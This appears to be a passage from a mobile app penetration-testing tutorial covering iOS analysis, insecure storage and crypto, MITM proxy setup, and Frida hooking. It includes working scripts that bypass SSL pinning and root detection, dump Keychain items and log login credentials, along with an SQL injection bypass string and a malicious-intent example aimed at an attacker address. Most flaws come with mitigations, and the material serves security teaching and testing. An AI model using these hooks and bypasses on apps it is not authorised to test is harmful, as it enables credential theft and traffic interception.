Bundle ID\n# - NSAppTransportSecurity: ATS settings (allows HTTP?)\n# - UIRequiredDeviceCapabilities: Required capabilities\n# - Entitlements: Permissions (location, camera, etc.)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Info.plist security checks:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-xml",children:"\x3c!-- Example Info.plist --\x3e\n<dict>\n    \x3c!-- App Transport Security (ATS) disabled (VULNERABLE!) --\x3e\n    <key>NSAppTransportSecurity</key>\n    <dict>\n        <key>NSAllowsArbitraryLoads</key>\n        <true/>  \x3c!-- Allows HTTP connections! --\x3e\n    </dict>\n\n    \x3c!-- URL schemes (deep linking attack surface) --\x3e\n    <key>CFBundleURLTypes</key>\n    <array>\n        <dict>\n            <key>CFBundleURLSchemes</key>\n            <array>\n                <string>myapp</string>  \x3c!-- myapp:// URL scheme --\x3e\n            </array>\n        </dict>\n    </array>\n</dict>\n"})}),"\n",(0,r.jsx)(n.h3,{id:"ios-dynamic-analysis",children:"iOS Dynamic Analysis"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 1: Jailbreak device"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Jailbreak tools (varies by iOS version):\n# - checkra1n (iOS 12-14.8.1, semi-tethered)\n# - unc0ver (iOS 11-14.8, semi-untethered)\n# - Taurine (iOS 14-14.3, semi-untethered)\n# - Odyssey (iOS 13-13.7)\n\n# After jailbreak, install essential tools via Cydia:\n# - OpenSSH (remote access)\n# - Frida (dynamic instrumentation)\n# - SSL Kill Switch 2 (bypass SSL pinning)\n# - AppSync Unified (install unsigned IPAs)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 2: SSH into device"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Install OpenSSH via Cydia\n\n# Connect via SSH (default password: alpine):\nssh root@&lt;device_ip&gt;\n\n# IMPORTANT: Change default password!\npasswd  # For root\npasswd mobile  # For mobile user\n\n# Explore filesystem:\ncd /var/mobile/Containers/Data/Application/\nls -la\n# Each app has a UUID directory\n\n# Find app by bundle ID:\nfind . -name "*.plist" -exec grep -l "com.example.app" {} \\;\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 3: Analyze app sandbox"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# App data directory:\n# /var/mobile/Containers/Data/Application/&lt;UUID&gt;/\n\n# Documents/        # User documents\n# Library/          # App data\n#   \u251c\u2500\u2500 Caches/     # Cached data\n#   \u251c\u2500\u2500 Preferences/  # User preferences (.plist files)\n#   \u2514\u2500\u2500 Cookies/    # Cookies\n# tmp/              # Temporary files\n\n# Check for sensitive data:\ncd /var/mobile/Containers/Data/Application/&lt;UUID&gt;/Library/Preferences/\n\n# View .plist files:\nplutil -p com.example.app.plist\n\n# Example (leaked token):\n# "api_token" => "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 4: Analyze Keychain (requires tool)"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install Keychain-Dumper:\n# https://github.com/ptoomey3/Keychain-Dumper\n\n# Copy to device:\nscp keychain_dumper root@&lt;device_ip&gt;:/tmp/\n\n# Run on device:\nssh root@&lt;device_ip&gt;\ncd /tmp\nchmod +x keychain_dumper\n./keychain_dumper\n\n# Output: All keychain items accessible by current app\n# Example:\n# Generic Password\n#   Service: com.example.app\n#   Account: user@example.com\n#   Password: supersecret123\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 5: Monitor system logs"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Install syslog on device (via Cydia)\n\n# View logs:\nssh root@&lt;device_ip&gt;\ntail -f /var/log/syslog | grep -i "app"\n\n# Or use Xcode Devices (macOS):\n# Xcode \u2192 Window \u2192 Devices and Simulators \u2192 Select device \u2192 Open Console\n'})}),"\n",(0,r.jsx)(n.h3,{id:"ios-static-analysis-automated",children:"iOS Static Analysis (Automated)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"MobSF (supports iOS):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Upload IPA to MobSF (same as Android):\n# http://localhost:8000\n\n# Automated analysis:\n# - Binary analysis (strings, symbols)\n# - Info.plist checks\n# - Code signing verification\n# - Entitlements analysis\n# - Hardcoded secrets detection\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"iMAS (iOS Mobile Application Security):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Source code analysis tool (for developers)\n# https://github.com/project-imas/\n\n# Scans Objective-C/Swift source for:\n# - Insecure data storage\n# - Weak crypto\n# - Insecure communication\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"common-mobile-vulnerabilities",children:"Common Mobile Vulnerabilities"}),"\n",(0,r.jsx)(n.h3,{id:"insecure-data-storage",children:"Insecure Data Storage"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Android - SharedPreferences (plaintext):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-xml",children:'\x3c!-- /data/data/com.example.app/shared_prefs/settings.xml --\x3e\n<map>\n    <string name="username">john@example.com</string>\n    <string name="password">password123</string>  \x3c!-- PLAINTEXT! --\x3e\n    <string name="api_token">sk_live_abc123</string>\n</map>\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Mitigation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'// Encrypt sensitive data with EncryptedSharedPreferences (Android):\nimport androidx.security.crypto.EncryptedSharedPreferences;\nimport androidx.security.crypto.MasterKeys;\n\nString masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC);\nSharedPreferences sharedPreferences = EncryptedSharedPreferences.create(\n    "secure_prefs",\n    masterKeyAlias,\n    context,\n    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,\n    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM\n);\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"iOS - NSUserDefaults (plaintext):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-objective-c",children:'// Vulnerable (plaintext storage):\n[[NSUserDefaults standardUserDefaults] setObject:@"password123" forKey:@"password"];\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Mitigation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-objective-c",children:'// Store sensitive data in Keychain:\n#import <Security/Security.h>\n\n// Save to Keychain:\nNSDictionary *query = @{\n    (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,\n    (__bridge id)kSecAttrService: @"com.example.app",\n    (__bridge id)kSecAttrAccount: @"user_token",\n    (__bridge id)kSecValueData: [@"secret_token" dataUsingEncoding:NSUTF8StringEncoding]\n};\nSecItemAdd((__bridge CFDictionaryRef)query, NULL);\n'})}),"\n",(0,r.jsx)(n.h3,{id:"insecure-communication",children:"Insecure Communication"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Cleartext HTTP traffic:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'// Vulnerable (Android):\nURL url = new URL("http://api.example.com/login");  // HTTP!\nHttpURLConnection conn = (HttpURLConnection) url.openConnection();\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Mitigation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'// Use HTTPS:\nURL url = new URL("https://api.example.com/login");\n\n// Android Network Security Config (res/xml/network_security_config.xml):\n<?xml version="1.0" encoding="utf-8"?>\n<network-security-config>\n    <base-config cleartextTrafficPermitted="false" />  \x3c!-- Block HTTP --\x3e\n</network-security-config>\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"iOS - App Transport Security (ATS) bypass:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-xml",children:"\x3c!-- Vulnerable Info.plist (allows HTTP): --\x3e\n<key>NSAppTransportSecurity</key>\n<dict>\n    <key>NSAllowsArbitraryLoads</key>\n    <true/>  \x3c!-- BAD! --\x3e\n</dict>\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Mitigation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-xml",children:"\x3c!-- Enforce HTTPS only: --\x3e\n<key>NSAppTransportSecurity</key>\n<dict>\n    <key>NSAllowsArbitraryLoads</key>\n    <false/>\n</dict>\n"})}),"\n",(0,r.jsx)(n.h3,{id:"hardcoded-secrets",children:"Hardcoded Secrets"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"API keys in code:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'// Android (decompiled):\npublic class APIClient {\n    private static final String API_KEY = "sk_live_abc123xyz";  // Exposed!\n    private static final String SECRET = "mysecret";\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Finding secrets:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Android:\njadx app.apk\ngrep -r "api_key\\|secret\\|password\\|token" output_dir/\n\n# iOS:\nstrings Payload/App.app/App | grep -i "api\\|key\\|secret\\|token"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Mitigation:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Store secrets server-side (fetch at runtime)"}),"\n",(0,r.jsx)(n.li,{children:"Use environment variables (build-time injection)"}),"\n",(0,r.jsx)(n.li,{children:"Obfuscate strings (minimal protection, not secure)"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"weak-cryptography",children:"Weak Cryptography"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"MD5/SHA1 for passwords:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:"// Vulnerable:\nString hashedPassword = MD5(password);  // MD5 is broken!\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Weak encryption:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'// Vulnerable (hardcoded key, ECB mode):\nSecretKeySpec key = new SecretKeySpec("1234567890123456".getBytes(), "AES");\nCipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");  // ECB mode!\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Mitigation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'// Use bcrypt/Argon2 for passwords (server-side):\n// For encryption, use AES-GCM with randomly generated keys:\nKeyGenerator keyGen = KeyGenerator.getInstance("AES");\nkeyGen.init(256);\nSecretKey key = keyGen.generateKey();\n\nCipher cipher = Cipher.getInstance("AES/GCM/NoPadding");\ncipher.init(Cipher.ENCRYPT_MODE, key);\nbyte[] iv = cipher.getIV();  // Save IV for decryption\nbyte[] encrypted = cipher.doFinal(plaintext.getBytes());\n'})}),"\n",(0,r.jsx)(n.h3,{id:"sql-injection-mobile",children:"SQL Injection (Mobile)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Vulnerable SQLite query:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'// Android:\nString query = "SELECT * FROM users WHERE username=\'" + username + "\'";\nCursor cursor = db.rawQuery(query, null);  // SQL injection!\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Exploitation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Username: admin' OR '1'='1' --\nQuery becomes: SELECT * FROM users WHERE username='admin' OR '1'='1' --'\nResult: Bypasses authentication\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Mitigation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'// Use parameterized queries:\nString query = "SELECT * FROM users WHERE username=?";\nCursor cursor = db.rawQuery(query, new String[]{username});\n'})}),"\n",(0,r.jsx)(n.h3,{id:"intent-hijacking-android",children:"Intent Hijacking (Android)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Exported component without permission:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-xml",children:'\x3c!-- AndroidManifest.xml --\x3e\n<activity android:name=".PaymentActivity"\n    android:exported="true">  \x3c!-- Accessible by other apps! --\x3e\n</activity>\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Exploitation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'// Malicious app sends intent:\nIntent intent = new Intent();\nintent.setComponent(new ComponentName("com.example.app", "com.example.app.PaymentActivity"));\nintent.putExtra("amount", 0.01);  // Manipulate payment amount\nintent.putExtra("recipient", "attacker@evil.com");\nstartActivity(intent);\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Mitigation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-xml",children:'\x3c!-- Require permission or set exported=false: --\x3e\n<activity android:name=".PaymentActivity"\n    android:exported="false">  \x3c!-- Only accessible by app --\x3e\n</activity>\n\n\x3c!-- Or require custom permission: --\x3e\n<permission android:name="com.example.app.PAYMENT_ACCESS"\n    android:protectionLevel="signature" />\n\n<activity android:name=".PaymentActivity"\n    android:permission="com.example.app.PAYMENT_ACCESS"\n    android:exported="true">\n</activity>\n'})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"network-analysis",children:"Network Analysis"}),"\n",(0,r.jsx)(n.h3,{id:"https-interception-mitm-proxy",children:"HTTPS Interception (MITM Proxy)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Setup Burp Suite for mobile:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 1: Configure proxy"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Burp Suite:\n# Proxy \u2192 Options \u2192 Proxy Listeners\n# Add: 0.0.0.0:8080 (all interfaces)\n\n# Find computer IP:\nip addr show  # Linux\nipconfig      # Windows\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 2: Configure device proxy"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Android:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Settings \u2192 Wi-Fi \u2192 Long-press network \u2192 Modify network\n\u2192 Advanced \u2192 Proxy: Manual\n   Hostname: &lt;computer_ip&gt;\n   Port: 8080\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"iOS:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Settings \u2192 Wi-Fi \u2192 Tap (i) next to network\n\u2192 HTTP Proxy: Manual\n   Server: &lt;computer_ip&gt;\n   Port: 8080\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 3: Install Burp CA certificate"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Android:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Export Burp CA cert:\n# Burp \u2192 Proxy \u2192 Options \u2192 Import/Export CA certificate\n# Export \u2192 Certificate in DER format \u2192 Save as burp.der\n\n# Convert to PEM:\nopenssl x509 -inform DER -in burp.der -out burp.crt\n\n# Get certificate hash (for Android 7+):\nopenssl x509 -inform PEM -subject_hash_old -in burp.crt | head -1\n# Output: 9a5ba575 (example hash)\n\n# Rename cert:\nmv burp.crt 9a5ba575.0\n\n# Push to device (requires root):\nadb root\nadb remount\nadb push 9a5ba575.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0\nadb reboot\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"iOS:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Navigate to Burp CA cert URL on device:\n# http://burp/cert\n# Download burp.crt\n\n# Install:\n# Settings \u2192 General \u2192 Profile Downloaded \u2192 Install\n# Settings \u2192 General \u2192 About \u2192 Certificate Trust Settings\n# Enable full trust for Burp CA\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 4: Intercept traffic"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Burp \u2192 Proxy \u2192 Intercept: ON\n# Launch app, observe HTTP/HTTPS requests\n\n# Example intercepted request:\nPOST /api/login HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{"username": "john", "password": "password123"}\n\n# Modify and forward\n'})}),"\n",(0,r.jsx)(n.h3,{id:"bypassing-certificate-pinning",children:"Bypassing Certificate Pinning"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Certificate pinning"})," validates server certificate against known cert/public key."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Detection:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Android: Search for keywords in decompiled code:\ngrep -r "CertificatePinner\\|TrustManager\\|PinningTrustManager" output_dir/\n\n# iOS: Search in binary:\nstrings Payload/App.app/App | grep -i "pin\\|certificate\\|ssl"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Bypass methods:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Frida script (runtime hooking):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'// Android - Bypass OkHttp CertificatePinner:\nJava.perform(function() {\n    var CertificatePinner = Java.use("okhttp3.CertificatePinner");\n    CertificatePinner.check.overload(\'java.lang.String\', \'java.util.List\').implementation = function(str, list) {\n        console.log("[+] Bypassing SSL pinning for: " + str);\n        return;  // Do nothing (skip pinning check)\n    };\n});\n\n// iOS - Bypass NSURLSession pinning:\nInterceptor.attach(ObjC.classes.NSURLSession["- URLSession:didReceiveChallenge:completionHandler:"].implementation, {\n    onEnter: function(args) {\n        console.log("[+] Bypassing SSL pinning");\n        var completionHandler = new ObjC.Block(args[4]);\n        completionHandler.implementation = function(disposition, credential) {\n            // Accept any certificate\n            var NSURLSessionAuthChallengeDisposition = {\n                UseCredential: 0,\n                PerformDefaultHandling: 1,\n                CancelAuthenticationChallenge: 2,\n                RejectProtectionSpace: 3\n            };\n            return completionHandler(NSURLSessionAuthChallengeDisposition.UseCredential, credential);\n        };\n    }\n});\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Xposed/Magisk module (Android):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install TrustMeAlready (Magisk module):\n# https://github.com/ViRb3/TrustMeAlready\n\n# Or SSLUnpinning (Xposed module):\n# Install via Xposed Installer app\n# Reboot device\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. SSL Kill Switch (iOS):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install via Cydia:\n# Search: SSL Kill Switch 2\n# Install and reboot\n# Toggle in Settings\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. Objection (automated):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install Objection:\npip3 install objection\n\n# Patch APK to include Frida gadget:\nobjection patchapk -s app.apk\n\n# Install patched APK:\nadb install app_objection.apk\n\n# Run Objection:\nobjection explore\n\n# Disable SSL pinning:\nandroid sslpinning disable\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"dynamic-instrumentation",children:"Dynamic Instrumentation"}),"\n",(0,r.jsx)(n.h3,{id:"frida-basics",children:"Frida Basics"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Installation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Install Frida on computer:\npip3 install frida frida-tools\n\n# Install Frida server on Android device:\n# Download frida-server for your architecture:\n# https://github.com/frida/frida/releases\n# Example: frida-server-16.0.0-android-arm64\n\nadb push frida-server /data/local/tmp/\nadb shell "chmod 755 /data/local/tmp/frida-server"\nadb shell "/data/local/tmp/frida-server &"\n\n# Install Frida on iOS (jailbroken):\n# Add Frida repo in Cydia: https://build.frida.re\n# Install: Frida\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Listing processes:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# List running apps:\nfrida-ps -U  # USB device\n\n# Output:\n#  PID  Name\n# ----  --------\n# 1234  com.example.app\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Attaching to app:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Spawn app with Frida:\nfrida -U -f com.example.app -l script.js\n\n# Attach to running app:\nfrida -U com.example.app -l script.js\n"})}),"\n",(0,r.jsx)(n.h3,{id:"frida-scripting-examples",children:"Frida Scripting Examples"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Hooking Java methods (Android):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'// Hook LoginActivity.loginUser() method\nJava.perform(function() {\n    var LoginActivity = Java.use("com.example.app.LoginActivity");\n\n    LoginActivity.loginUser.implementation = function(username, password) {\n        console.log("[+] loginUser called!");\n        console.log("    Username: " + username);\n        console.log("    Password: " + password);\n\n        // Call original method:\n        var result = this.loginUser(username, password);\n        console.log("    Result: " + result);\n        return result;\n    };\n});\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Bypassing root detection (Android):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'Java.perform(function() {\n    // Hook common root detection methods:\n\n    // Method 1: Check for su binary\n    var File = Java.use("java.io.File");\n    File.exists.implementation = function() {\n        var path = this.getAbsolutePath();\n        if (path.indexOf("su") !== -1) {\n            console.log("[+] Hiding su binary: " + path);\n            return false;  // Pretend su doesn\'t exist\n        }\n        return this.exists();\n    };\n\n    // Method 2: Check for Magisk/SuperSU\n    var PackageManager = Java.use("android.app.ApplicationPackageManager");\n    PackageManager.getPackageInfo.overload(\'java.lang.String\', \'int\').implementation = function(packageName, flags) {\n        if (packageName === "com.topjohnwu.magisk" || packageName === "eu.chainfire.supersu") {\n            console.log("[+] Hiding root package: " + packageName);\n            throw Java.use("android.content.pm.PackageManager$NameNotFoundException").$new();\n        }\n        return this.getPackageInfo(packageName, flags);\n    };\n});\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Hooking Objective-C methods (iOS):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'// Hook UIViewController viewDidLoad\nif (ObjC.available) {\n    var UIViewController = ObjC.classes.UIViewController;\n    Interceptor.attach(UIViewController[\'- viewDidLoad\'].implementation, {\n        onEnter: function(args) {\n            var controller = new ObjC.Object(args[0]);\n            console.log("[+] viewDidLoad called on: " + controller.$className);\n        }\n    });\n\n    // Hook specific class method:\n    var LoginVC = ObjC.classes.LoginViewController;\n    Interceptor.attach(LoginVC[\'- loginWithUsername:password:\'].implementation, {\n        onEnter: function(args) {\n            var username = new ObjC.Object(args[2]).toString();\n            var password = new ObjC.Object(args[3]).toString();\n            console.log("[+] Login attempt:");\n            console.log("    Username: " + username);\n            console.log("    Password: " + password);\n        }\n    });\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. Dumping memory:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'// Dump all loaded modules:\nProcess.enumerateModules({\n    onMatch: function(module) {\n        console.log("Module: " + module.name + " @ " + module.base);\n    },\n    onComplete: function() {}\n});\n\n// Dump memory region:\nvar baseAddr = Module.findBaseAddress("libnative.so");\nvar size = 0x1000;  // 4KB\nconsole.log(hexdump(baseAddr, { length: size }));\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"5. Tracing all function calls:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'// Android - Trace all methods in a class:\nJava.perform(function() {\n    var LoginActivity = Java.use("com.example.app.LoginActivity");\n\n    LoginActivity.$init.implementation = function() {\n        console.log("[+] LoginActivity constructor");\n        return this.$init();\n    };\n\n    var methods = LoginActivity.class.getDeclaredMethods();\n    methods.forEach(function(method) {\n        var methodName = method.getName();\n        if (LoginActivity[methodName]) {\n            LoginActivity[methodName].implementation = function() {\n                console.log("[+] Called: " + methodName);\n                return this[methodName].apply(this, arguments);\n            };\n        }\n    });\n});\n'})}),"\n",(0,r.jsx)(n.h3,{id:"objection-frida-repl",children:"Objection (Frida REPL)"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Objection"})," provides interactive Frida REPL with common commands."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Launch Objection:\nobjection -g com.example.app explore\n\n# Common commands:\nandroid hooking list classes                  # List all classes\nandroid hooking search classes LoginActivity  # Search classes\nandroid hooking list class_methods com.example.app.LoginActivity  # List methods\nandroid hooking watch class com.example.app.LoginActivity  # Hook all methods\n\nandroid sslpinning disable                    # Bypass SSL pinning\nandroid root disable                          # Bypass root detection\n\nios hooking list classes                      # List Objective-C classes\nios hooking search classes LoginViewController\nios hooking watch class LoginViewController\n\nmemory dump all &lt;output_file&gt;                 # Dump memory\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"bypassing-security-controls",children:"Bypassing Security Controls"}),"\n",(0,r.jsx)(n.h3,{id:"rootjailbreak-detection-bypass",children:"Root/Jailbreak Detection Bypass"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Android root detection methods:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Check for su binary:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'File suFile = new File("/system/xbin/su");\nif (suFile.exists()) {\n    // Rooted!\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Bypass with Frida (see Frida examples above)"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Check for root apps (Magisk, SuperSU):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'PackageManager pm = getPackageManager();\ntry {\n    pm.getPackageInfo("com.topjohnwu.magisk", 0);\n    // Magisk installed = rooted\n} catch (PackageManager.NameNotFoundException e) {\n    // Not rooted\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Check build tags:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'String buildTags = Build.TAGS;\nif (buildTags.contains("test-keys")) {\n    // Custom ROM = likely rooted\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"iOS jailbreak detection:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Check for Cydia/jailbreak apps:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-objective-c",children:'if ([[NSFileManager defaultManager] fileExistsAtPath:@"/Applications/Cydia.app"]) {\n    // Jailbroken\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Check for write access to /private:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-objective-c",children:'if ([[NSFileManager defaultManager] isWritableFileAtPath:@"/private"]) {\n    // 